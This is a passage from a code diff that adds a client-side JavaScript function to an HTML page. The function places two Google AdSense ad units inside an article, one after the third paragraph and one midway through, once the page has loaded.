+        function injectAds() {
+          var article = document.querySelector('article');
+          if (!article) return;
+
+          var allP = article.querySelectorAll('p');
+          if (allP.length < 6) return;
+
+          // Ad 1: after paragraph 3 (post-intro)
+          var introTarget = allP[2];
+          if (introTarget && introTarget.parentNode) {
+            var ad1 = createAdUnit('post-intro');
+            introTarget.parentNode.insertBefore(ad1, introTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+
+          // Re-query after first insertion, place mid-article ad
+          allP = article.querySelectorAll('p');
+          var midIdx = Math.floor(allP.length / 2);
+          if (midIdx < 6) midIdx = 6;
+          var midTarget = allP[midIdx];
+          if (midTarget && midTarget.parentNode) {
+            var ad2 = createAdUnit('mid-article');
+            midTarget.parentNode.insertBefore(ad2, midTarget.nextSibling);
+            try { (window.adsbygoogle = window.adsbygoogle || []).push({}); } catch(e) {}
+          }
+        }
+
+        if (document.readyState === 'loading') {
+          document.addEventListener('DOMContentLoaded', injectAds);
+        } else {
+          injectAds();
+        }
+      })();
+    </script>
+</body>
+</html>
